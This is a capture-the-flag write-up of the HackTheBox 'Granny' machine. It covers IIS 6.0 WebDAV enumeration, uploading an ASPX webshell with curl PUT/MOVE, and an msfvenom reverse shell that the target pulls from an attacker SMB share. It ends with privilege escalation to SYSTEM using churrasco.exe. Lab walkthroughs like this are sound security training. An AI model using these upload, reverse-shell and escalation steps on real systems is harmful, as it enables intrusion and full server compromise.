---
title: "Granny"
date: 2023-08-10T11:30:03+00:00
tags: ["web","windows", "Frontpage extension anonymous login"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Granny.png"
comments: false
description: "This is a friendly windows machine that has a web page vulnerable due to a low version of IIS and Microsoft ASP.NET"
---

## Room Information

- Room name: Granny
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Granny

![/HTB/Granny.png](/HTB/Granny.png)

## Tools Used

- Nmap
- searchsploit
- wfuzz
- gobuster
- smbserver.py
- msfvenom
- davtest
- juicypotato
- churrasco.exe
- cmdasp.aspx

## Port Scanning

Other room, other port scan.

```ruby
# Nmap 7.94 scan initiated Wed Aug 30 03:27:34 2023 as: nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.21s latency).
Scanned at 2023-08-30 03:27:35 EDT for 44s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Wed, 30 Aug 2023 07:28:16 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 30 03:28:19 2023 -- 1 IP address (1 host up) scanned in 45.21 seconds
```

I found 1 open port, 80(http). So let's focus on the website…

## Enumeration

On the directory listing with `gobuster` and `wfuzz` It throws me nothing relevant so I used other methods.

```ruby
┌──(kali㉿kali)-[~/HTB/granny]
└─$ gobuster dir -u http://10.10.10.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.15/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/30 07:06:49 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 149] [--> http://10.10.10.15/images/]
/Images               (Status: 301) [Size: 149] [--> http://10.10.10.15/Images/]
/IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.15/IMAGES/]
...
```

Then as in the previous machine something similar happened to me I preferred to do a deeper analysis with **nmap** using `-script vuln` and I got these results:

```ruby
Nmap scan report for 10.10.10.15
Host is up (0.19s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /_vti_log/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 514.61 seconds
```

So let’s focus on this vulnerability, I found some things like this:

```ruby
┌──(kali㉿kali)-[~/HTB/granny]
└─$ GET http://10.10.10.15//_vti_inf.html

<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<title> FrontPage Configuration Information </title>
</head>

<body>
<!-- _vti_inf.html version 0.100>
<!-- 
	This file contains important information used by the FrontPage client
	(the FrontPage Explorer and FrontPage Editor) to communicate with the
	FrontPage server extensions installed on this web server.

	The values below are automatically set by FrontPage at installation.  Normally, you do not need to modify these values, but in case
	you do, the parameters are as follows:

	'FPShtmlScriptUrl', 'FPAuthorScriptUrl', and 'FPAdminScriptUrl' specify
	the relative urls for the scripts that FrontPage uses for remote
	authoring.  These values should not be changed.

	'FPVersion' identifies the version of the FrontPage Server Extensions
	installed, and should not be changed.
--><!-- FrontPage Configuration Information
    FPVersion="5.0.2.6790"
    FPShtmlScriptUrl="_vti_bin/shtml.dll/_vti_rpc"
    FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"
    FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"
    TPScriptUrl="_vti_bin/owssvr.dll"
-->
<p><!--webbot bot="PurpleText"
preview="This page is placed into the root directory of your FrontPage web when FrontPage is installed.  It contains information used by the FrontPage client to communicate with the FrontPage server extensions installed on this web server.  You should not delete this file."
--></p>

<h1>FrontPage Configuration Information </h1>

<p>In the HTML comments, this page contains configuration
information that the FrontPage Explorer and FrontPage Editor need to
communicate with the FrontPage server extensions installed on
this web server. Do not delete this page.</p>
</body>
</html>
```

But with this I couldn't get anywhere, I knew I had a connection to the web but that was it.

## Exploiting

So I returned to the first nmap scan to this:

```ruby
 http-webdav-scan: 
	 Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
	 Server Date: Wed, 30 Aug 2023 07:28:16 GMT
	 Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
```

Seeing that there was this (http-webdav) I decided to run `davtest` to check what kind of files I could copy inside the victim machine.

```ruby
┌──(kali㉿kali)-[~/HTB/granny]
└─$ davtest -url http://10.10.10.15 
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: q8mdd1Gibua
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_q8mdd1Gibua
********************************************************
 Sending test files
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.php
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.html
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.cfm
PUT	cgi	FAIL
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.jsp
PUT	shtml	FAIL
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.pl
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.jhtml
PUT	aspx	FAIL
PUT	asp	FAIL
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.txt
********************************************************
 Checking for test file execution
EXEC	php	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.html
EXEC	html	FAIL
EXEC	cfm	FAIL
EXEC	jsp	FAIL
EXEC	pl	FAIL
EXEC	jhtml	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.txt
EXEC	txt	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_q8mdd1Gibua
PUT File: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.php
PUT File: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.html
PUT File: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.cfm
PUT File: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.jsp
PUT File: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.pl
PUT File: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.jhtml
PUT File: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.txt
Executes: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.html
Executes: http://10.10.10.15/DavTestDir_q8mdd1Gibua/davtest_q8mdd1Gibua.txt
```

So my idea was to upload an .exe file and then search for it with the url pointing to it and then run it. And I download this exploit → https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

```ruby
┌──(kali㉿kali)-[~/HTB/granny]
└─$ curl -s -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.txt

┌──(kali㉿kali)-[~/HTB/granny]
└─$ curl -s -X MOVE -H "Destination:http://10.10.10.15/cmdasp.aspx" http://10.10.10.15/cmdasp.txt
```

I use this command to download and execute the reverse shell I did with `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f exe > reverse.exe` -> `\\10.10.14.6\\smbFolder\reverse.exe -e cmd 10.10.14.6 443`

![Untitled](/HTB/web-granny.png)

So before I hit the **execute** button I listened on port 443 and then hit it and got the reverse shell. We are in 😇

```ruby
C:\WINDOWS\Temp\privesc> whoami
 whoami
nt authority\network service
```

## Escalation of privileges

The first thing I always do in windows is to see what user we are and if we can access any input flag. In this case I could not access any flag, so I had to escalate privileges. The next thing I did was to see the permissions I had.

```ruby
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
**SeImpersonatePrivilege        Impersonate a client after authentication Enabled  -> JuiciPotato**
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

When I saw that the `SeImpersonatePrivilege` permission was enabled, the vulnerability called `JuicyPotato` came to my mind. 

So I will look for this vulnerability but according to the version of the victim machine because otherwise it would have no effect and we would waste our time. So I made a `systemminfo` and by the way I secured it in case I had to use it later for a vulnerability scan with `python2 windows-exploit-suggester.py -d 2023-08-30-mssb.xls -i /home/kali/HTB/granny/systemminfo.txt`. I got the following:

```ruby
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 57 Minutes, 16 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 6 Model 85 Stepping 7 GenuineIntel ~2293 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 737 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,281 MB
Page File: In Use:         189 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

Now that I knew I was dealing with a `Microsoft(R) Windows(R) Server 2003, Standard Edition` all that was left was to look it up on the internet and download the exploit. The website → https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

After this, the only thing left to do was to pass the exploit (churrasco.exe) through the smbserver to the victim machine together with the exploit I made previously with msfvenom (shell.exe).

```ruby
C:\WINDOWS\Temp\privesc>**churrasco.exe -d "C:\WINDOWS\Temp\privesc\shell.exe"**
churrasco.exe -d "C:\WINDOWS\Temp\privesc\shell.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

Then I was root 😎

```ruby
C:\DOCUME~1\Administrator\Desktop>whoami
whoami
nt authority\system

C:\DOCUME~1\Administrator\Desktop>typ root.txt
```

## Lessons Learned

- What insights did you gain from the room?
    
    I learned more about Frontpage extension anonymous login.
    
- Were there any novel tools or techniques employed?
    
    churrasco.exe, and cmdasp.aspx
